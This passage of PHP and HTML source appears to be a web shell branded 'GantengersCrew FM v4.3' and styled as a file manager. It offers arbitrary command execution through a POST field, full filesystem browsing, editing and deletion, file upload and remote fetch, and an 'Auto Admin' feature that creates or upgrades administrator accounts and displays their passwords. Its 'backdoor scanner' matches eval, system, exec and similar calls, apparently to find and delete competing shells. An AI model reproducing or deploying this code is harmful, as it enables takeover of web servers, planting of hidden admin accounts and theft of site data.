if (isset($_POST['new_file']) && $_POST['new_file'] !== '') {
    $n = basename($_POST['new_file']);
    safe_save($path . '/' . $n, '');
    header('Location: ?path=' . urlencode($path));
    exit;
}

$save_msg = '';
if (isset($_POST['save_content']) && isset($_GET['item'])) {
    $content = $_POST['save_content'];
    if (strlen($content) > $FM_MAX_EDIT) {
        $save_msg = ['err', 'Content too large (max ' . hs($FM_MAX_EDIT) . ')'];
    } else {
        if ($FM_BACKUP && file_exists($_GET['item'])) @copy($_GET['item'], $_GET['item'] . '.bak');
        if (safe_save($_GET['item'], $content)) {
            clearstatcache(true, $_GET['item']);
            $save_msg = ['ok', 'Saved (' . hs(@filesize($_GET['item'])) . ')'];
        } else {
            $save_msg = ['err', 'Save failed'];
        }
    }
}

$cmd_out = '';
if (isset($_POST['c']) && $_POST['c'] !== '') {
    $cmd_out = _cmd($_POST['c']);
    if (empty($cmd_out)) $cmd_out = '[empty output]';
}

$scan_results = [];
if (isset($_GET['tool']) && $_GET['tool'] === 'scanner') {
    $items = @scandir($path);
    if ($items) {
        foreach ($items as $i) {
            if ($i === '.' || $i === '..') continue;
            $f = $path . '/' . $i;
            if (!is_file($f)) continue;
            $ext = strtolower(pathinfo($i, PATHINFO_EXTENSION));
            if (!in_array($ext, ['php','phtml','php3','php4','php5','php7','php8','inc','shtml','cgi','pl'])) continue;
            $sz = @filesize($f);
            if ($sz > 1048576) continue;
            $c = @file_get_contents($f);
            if ($c === false) continue;
            $flags = [];
            if (preg_match('/eval\s*\(/i', $c))           $flags[] = 'eval';
            if (preg_match('/base64_decode\s*\(/i', $c))  $flags[] = 'base64_decode';
            if (preg_match('/\bsystem\s*\(/i', $c))       $flags[] = 'system';
            if (preg_match('/shell_exec\s*\(/i', $c))     $flags[] = 'shell_exec';
            if (preg_match('/\bpassthru\s*\(/i', $c))     $flags[] = 'passthru';
            if (preg_match('/\bexec\s*\(/i', $c))         $flags[] = 'exec';
            if (preg_match('/\bpopen\s*\(/i', $c))        $flags[] = 'popen';
            if (preg_match('/\bassert\s*\(/i', $c))       $flags[] = 'assert';
            if (!empty($flags)) $scan_results[] = ['file' => $i, 'path' => $f, 'size' => $sz, 'flags' => $flags];
        }
    }
}
?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FM</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f1419;color:#d4d4d4;font-family:'Segoe UI',Consolas,monospace;font-size:14px;padding:16px;line-height:1.55}
a{color:#4fc3f7;text-decoration:none}
a:hover{color:#81d4fa;text-decoration:underline}
.box{background:#1a1f26;border:1px solid #2a3138;padding:14px 16px;margin-bottom:12px;border-radius:8px;word-break:break-all}
.box.ok{border-color:#2a5a2a;background:#152a15}
.box.err{border-color:#7a2a2a;background:#2a1515}
h2{color:#ffb74d;font-weight:600;margin-bottom:10px;font-size:20px}
h3{color:#81c784;font-weight:600;margin-bottom:10px;font-size:15px}
table{width:100%;border-collapse:collapse;margin-top:6px;background:#1a1f26;border-radius:8px;overflow:hidden;border:1px solid #2a3138}
th,td{border-bottom:1px solid #242a31;padding:9px 12px;text-align:left;vertical-align:middle;font-size:13px}
th{background:#222831;color:#ffb74d;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:1px}
tr:last-child td{border-bottom:none}
tr:hover td{background:#1e242b}
input[type=text],input[type=password],input[type=file],textarea{background:#0f1419;color:#d4d4d4;border:1px solid #2a3138;padding:8px 12px;font-family:inherit;font-size:13px;border-radius:6px;outline:none}
input:focus,textarea:focus{border-color:#ffb74d;box-shadow:0 0 0 3px rgba(255,183,77,.1)}
textarea{width:100%;min-height:420px;resize:vertical;line-height:1.55;font-family:Consolas,monospace;font-size:13px}
.btn{display:inline-block;background:#ffb74d;color:#0f1419;border:none;cursor:pointer;padding:8px 18px;font-family:inherit;font-weight:600;font-size:13px;border-radius:6px;letter-spacing:.3px;text-decoration:none;transition:all .15s}
.btn:hover{background:#ffc266;box-shadow:0 4px 12px rgba(255,183,77,.3);transform:translateY(-1px);text-decoration:none;color:#0f1419}
.btn-sm{padding:4px 10px;font-size:12px;font-weight:500}
.btn-blue{background:#4fc3f7;color:#0f1419}
.btn-blue:hover{background:#81d4fa}
.btn-gray{background:#374151;color:#d4d4d4}
.btn-gray:hover{background:#4b5563;transform:none;box-shadow:none}
.btn-red{background:#ef5350;color:#fff}
.btn-red:hover{background:#f77674}
.btn-green{background:#81c784;color:#0f1419}
.btn-green:hover{background:#a5d6a7}
hr{border:0;border-top:1px solid #2a3138;margin:14px 0}
pre{background:#0a0e13;color:#81c784;padding:14px 16px;border:1px solid #2a3138;border-radius:6px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow:auto;font-family:Consolas,monospace;font-size:13px;line-height:1.55}
.ok-c{color:#81c784}
.err-c{color:#ef5350}
.warn-c{color:#ffb74d}
.dim{color:#6b7280}
.crumb{background:#1a1f26;padding:10px 14px;border-radius:6px;font-size:13px;border:1px solid #2a3138}
.toolbar{background:#1a1f26;padding:12px 14px;border-radius:8px;margin-bottom:12px;border:1px solid #2a3138;display:flex;flex-wrap:wrap;gap:10px;align-items:center}
.toolbar form{display:inline-flex;gap:8px;align-items:center}
.badge{display:inline-block;padding:2px 9px;background:#2a3138;color:#d4d4d4;border-radius:12px;font-size:11px;font-weight:500}
.badge.wr{background:#1e3a1e;color:#81c784}
.badge.rd{background:#3a301e;color:#ffb74d}
.badge.nn{background:#3a1e1e;color:#ef5350}
.icon{display:inline-block;width:22px;text-align:center;margin-right:4px}
.stat-grid{display:flex;flex-wrap:wrap;gap:14px;font-size:13px;color:#9ca3af}
.stat-grid b{color:#d4d4d4}
.hidden-file{color:#6b7280;font-style:italic}
.card{background:#1a1f26;border:1px solid #2a3138;border-radius:8px;padding:18px;margin:15px 0}
.card h2{color:#4fc3f7;font-weight:600;font-size:16px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #2a3138}
.user{background:#0f1419;padding:12px;border-radius:6px;margin:6px 0;border-left:3px solid #81c784}
.user b{color:#81c784;font-weight:600}
.lbl{color:#6b7280;font-size:12px}
</style>
</head>
<body>

<h2>🐉 GantengersCrew FM v4.3</h2>

<div class="box">
    <div class="stat-grid">
        <span><b>OS:</b> <?=htmlspecialchars($os)?></span>
        <span><b>IP:</b> <?=htmlspecialchars($server_ip)?></span>
        <span><b>User:</b> <?=htmlspecialchars($user)?></span>
        <span><b>PHP:</b> <?=PHP_VERSION?></span>
        <span style="margin-left:auto"><a href="?logout=1" class="err-c">[ Logout ]</a></span>
    </div>
</div>

<div class="crumb">
    <b>PATH:</b>
    <?php
    $ps = explode('/', trim($path, '/'));
    $acc = '';
    echo ' <a href="?path=/">/</a>';
    foreach ($ps as $p) {
        if ($p === '') continue;
        $acc .= '/' . $p;
        echo '<a href="?path=' . urlencode($acc) . '">' . htmlspecialchars($p) . '</a>/';
    }
    ?>
</div>

<br>

<div class="toolbar">
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="f" required style="max-width:180px">
        <button class="btn btn-sm" name="up">📤 Upload</button>
    </form>
    <form method="POST">
        <input type="text" name="new_folder" placeholder="folder name" required style="width:130px">
        <button class="btn btn-sm btn-gray">📁 +Folder</button>
    </form>
    <form method="POST">
        <input type="text" name="new_file" placeholder="file.txt" required style="width:130px">
        <button class="btn btn-sm btn-gray">📄 +File</button>
    </form>
    <a href="?path=<?=urlencode($path)?>&tool=cmd" class="btn btn-sm btn-gray">⚡ CMD</a>
    <a href="?path=<?=urlencode($path)?>&tool=scanner" class="btn btn-sm btn-gray">🔍 Scanner</a>
    <a href="?admin=1" class="btn btn-sm btn-green">👑 Auto Admin</a>
</div>

<div class="toolbar">
    <form method="POST" style="flex:1;display:flex;gap:8px;width:100%">
        <b style="color:#81c784">🌐 Remote:</b>
        <input type="text" name="remote_url" placeholder="https://example.com/file.zip" required style="flex:1;min-width:250px">
        <button class="btn btn-sm btn-blue">⬇ Fetch</button>
    </form>
</div>

<?php if ($upload_msg): ?>
    <div class="box <?=$upload_msg[0]?>"><?=$upload_msg[0] === 'ok' ? '✓' : '✗'?> <?=htmlspecialchars($upload_msg[1])?></div>
<?php endif; ?>

<?php if ($remote_msg): ?>
    <div class="box <?=$remote_msg[0]?>"><?=$remote_msg[0] === 'ok' ? '✓' : '✗'?> <?=htmlspecialchars($remote_msg[1])?></div>
<?php endif; ?>

<?php if ($admin_result): ?>
    <div class="box ok">✓ Auto Admin: <?=$admin_result['total']?> users created</div>
    <?php foreach ($admin_result['results'] as $res): ?>
        <div class="card">
            <h2><?=htmlspecialchars($res['type'])?> — <?=$res['ok']?> users</h2>
            <div style="color:#6b7280;font-size:12px;margin-bottom:8px">Path: <?=htmlspecialchars($res['path'])?></div>
            <?php foreach ($res['users'] as $u): if (($u['ok'] ?? 0) !== 1) continue; ?>
                <div class="user">
                    <?php if (!empty($u['upgraded'])): ?>
                        <span class="lbl">UPGRADED →</span> <b><?=htmlspecialchars($u['u'])?></b> — <?=htmlspecialchars($u['e'])?>
                    <?php else: ?>
                        <span class="lbl">USER</span> <b><?=htmlspecialchars($u['u'])?></b>
                        <span class="lbl">PASS</span> <b><?=htmlspecialchars($u['p'])?></b><br>
                        <span class="lbl">EMAIL</span> <?=htmlspecialchars($u['e'])?>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
            <?php if (!empty($res['url'])): ?>
                <div style="margin-top:10px;font-size:12px"><a href="<?=htmlspecialchars($res['url'])?>" target="_blank">→ <?=htmlspecialchars($res['url'])?></a></div>
            <?php endif; ?>
        </div>
    <?php endforeach; ?>
<?php endif; ?>

<?php if (isset($_GET['tool']) && $_GET['tool'] === 'cmd'): ?>
    <div class="box">
        <h3>⚡ Execute Command</h3>
        <form method="POST" style="margin-top:8px">
            <input type="text" name="c" value="<?=htmlspecialchars($_POST['c'] ?? '')?>" style="width:75%;font-family:Consolas,monospace" autofocus placeholder="command...">
            <button class="btn">Run</button>
        </form>
        <?php if ($cmd_out !== ''): ?>
            <pre style="margin-top:12px"><?=htmlspecialchars($cmd_out)?></pre>
        <?php endif; ?>
    </div>
<?php endif; ?>

<?php if (isset($_GET['tool']) && $_GET['tool'] === 'edit' && isset($_GET['item']) && is_file($_GET['item'])): 
    $ef = $_GET['item'];
    $esize = @filesize($ef);
    $econtent = @file_get_contents($ef);
?>
    <div class="box">
        <h3>✏️ Editor: <?=htmlspecialchars(basename($ef))?> <span class="dim">(<?=hs($esize)?>)</span></h3>
        <?php if ($save_msg): ?>
            <div class="<?=$save_msg[0] === 'ok' ? 'ok-c' : 'err-c'?>" style="margin:8px 0"><?=$save_msg[0] === 'ok' ? '✓' : '✗'?> <?=htmlspecialchars($save_msg[1])?></div>
        <?php endif; ?>
        <form method="POST" style="margin-top:10px">
            <textarea name="save_content" id="editor" autofocus><?=htmlspecialchars($econtent)?></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;align-items:center">
                <button class="btn" type="submit">💾 Save</button>
                <a href="?path=<?=urlencode($path)?>" class="btn btn-gray">Cancel</a>
                <span class="dim">Size: <b id="size-live"><?=number_format($esize)?></b> bytes</span>
            </div>
        </form>
    </div>
    <script>
    var ed = document.getElementById('editor');
    var szLive = document.getElementById('size-live');
    var origSize = <?=$esize?>;
    ed.addEventListener('input', function(){
        var sz = new Blob([ed.value]).size;
        szLive.textContent = sz.toLocaleString();
        szLive.style.color = (sz === 0 && origSize > 0) ? '#ef5350' : (sz !== origSize ? '#ffb74d' : '#81c784');
    });
    ed.addEventListener('keydown', function(e){
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            if (new Blob([ed.value]).size === 0 && origSize > 0) {
                if (!confirm('⚠ WARNING: File akan jadi 0KB. Yakin?')) return;
            }
            ed.form.submit();
        }
    });
    </script>
<?php endif; ?>

<?php if (isset($_GET['rename']) && (is_file($_GET['rename']) || is_dir($_GET['rename']))): ?>
    <div class="box">
        <h3>📝 Rename</h3>
        <form method="POST" style="margin-top:8px">
            <input type="hidden" name="rename_from" value="<?=htmlspecialchars($_GET['rename'])?>">
            <input type="text" name="rename_to" value="<?=htmlspecialchars(basename($_GET['rename']))?>" style="width:60%" autofocus>
            <button class="btn">Rename</button>
            <a href="?path=<?=urlencode($path)?>" class="btn btn-gray">Cancel</a>
        </form>
    </div>
<?php endif; ?>

<?php if (isset($_GET['tool']) && $_GET['tool'] === 'scanner'): ?>
    <div class="box">
        <h3>🔍 Backdoor Scanner</h3>
        <div class="dim">Scanned: <?=htmlspecialchars($path)?> · <?=count($scan_results)?> file mencurigakan</div>
        <?php if (empty($scan_results)): ?>
            <div class="ok-c" style="margin-top:10px">✓ Tidak ada file mencurigakan.</div>
        <?php else: ?>
            <table style="margin-top:12px">
                <tr><th style="width:40%">File</th><th style="width:100px">Ukuran</th><th>Flags</th><th style="width:160px">Aksi</th></tr>
                <?php foreach ($scan_results as $r): ?>
                    <tr>
                        <td><span class="warn-c">[!]</span> <?=htmlspecialchars($r['file'])?></td>
                        <td class="dim"><?=hs($r['size'])?></td>
                        <td><span class="warn-c"><?=implode(', ', $r['flags'])?></span></td>
                        <td>
                            <a href="?path=<?=urlencode($path)?>&tool=edit&item=<?=urlencode($r['path'])?>" class="btn btn-sm btn-blue">Edit</a>
                            <a href="?path=<?=urlencode($path)?>&act=del&item=<?=urlencode($r['path'])?>" class="btn btn-sm btn-red" onclick="return confirm('Hapus?')">Hapus</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </table>
        <?php endif; ?>
    </div>
<?php endif; ?>

<table>
    <tr><th style="width:50%">Nama</th><th style="width:100px">Ukuran</th><th style="width:90px">Perm</th><th style="width:130px">Waktu</th><th>Aksi</th></tr>

    <?php if ($path !== '/'): ?>
        <tr><td colspan="5"><a href="?path=<?=urlencode(dirname($path))?>">📂 .. (naik)</a></td></tr>
    <?php endif; ?>

    <?php
    $items = @scandir($path);
    if ($items):
        $dirs = []; $files = [];
        foreach ($items as $i) {
            if ($i === '.' || $i === '..') continue;
            if (!$FM_SHOW_HID && $i[0] === '.') continue;
            $full = $path . '/' . $i;
            if (is_dir($full)) $dirs[] = $i;
            else $files[] = $i;
        }
        sort($dirs); sort($files);
        $all = $FM_FILE_FIRST ? array_merge($files, $dirs) : array_merge($dirs, $files);
        foreach ($all as $i):
            $full = $path . '/' . $i;
            $is_dir = is_dir($full);
            $fsize = $is_dir ? 0 : @filesize($full);
            $size = $is_dir ? 'DIR' : hs($fsize);
            $perm = @substr(sprintf('%o', @fileperms($full)), -4);
            $mtime = @date('Y-m-d H:i', @filemtime($full));
            $icon = $is_dir ? '📁' : '📄';
            $pclass = @is_writable($full) ? 'wr' : (@is_readable($full) ? 'rd' : 'nn');
            $is_hidden = ($i[0] === '.');
    ?>
        <tr>
            <td>
                <?php if ($is_dir): ?>
                    <span class="icon"><?=$icon?></span><a href="?path=<?=urlencode($full)?>"><?=htmlspecialchars($i)?></a>
                <?php else: ?>
                    <span class="icon"><?=$icon?></span><span class="<?=$is_hidden ? 'hidden-file' : ''?>"><?=htmlspecialchars($i)?></span>
                    <?php if ($fsize === 0): ?> <span class="badge nn">0KB</span><?php endif; ?>
                <?php endif; ?>
            </td>
            <td class="dim"><?=$size?></td>
            <td><span class="badge <?=$pclass?>"><?=$perm?></span></td>
            <td class="dim"><?=$mtime?></td>
            <td>
                <?php if (!$is_dir): ?>
                    <a href="?path=<?=urlencode($path)?>&tool=edit&item=<?=urlencode($full)?>" class="btn btn-sm btn-blue">✏ Edit</a>
                <?php endif; ?>
                <a href="?path=<?=urlencode($path)?>&rename=<?=urlencode($full)?>" class="btn btn-sm btn-gray">📝</a>
                <a href="?path=<?=urlencode($path)?>&act=del&item=<?=urlencode($full)?>" class="btn btn-sm btn-red" onclick="return confirm('Hapus <?=htmlspecialchars(addslashes($i))?>?')">🗑</a>
            </td>
        </tr>
    <?php endforeach; else: ?>
        <tr><td colspan="5" class="dim">Folder kosong atau tidak bisa dibaca.</td></tr>
    <?php endif; ?>
</table>

<div class="box" style="text-align:center;margin-top:15px;padding:12px">
    <span class="dim">GantengersCrew FM v4.3 · Full Feature + Auto Admin + Auto-Restore</span>
</div>

</body>
</html>
